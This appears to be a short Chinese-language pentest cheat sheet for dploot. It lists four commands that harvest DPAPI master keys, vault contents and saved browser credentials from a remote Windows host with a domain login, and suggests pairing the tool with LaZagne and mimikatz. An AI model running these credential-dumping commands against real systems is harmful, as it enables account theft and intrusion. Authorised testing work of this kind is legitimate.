# dploot 常用用法

dploot 适合 DPAPI 和浏览器凭据相关收集。常用参数：域、用户、密码、NTLM hash、目标主机。

```bash
dploot triage -u USER -p 'PASSWORD' -d example.local -t 192.168.1.10
```

```bash
dploot browser -u USER -p 'PASSWORD' -d example.local -t 192.168.1.10
```

```bash
dploot masterkeys -u USER -p 'PASSWORD' -d example.local -t 192.168.1.10
```

```bash
dploot vaults -u USER -p 'PASSWORD' -d example.local -t 192.168.1.10
```

小记录：dploot 适合和 LaZagne、mimikatz、浏览器目录一起看。凭据类结果要按来源和用途整理。
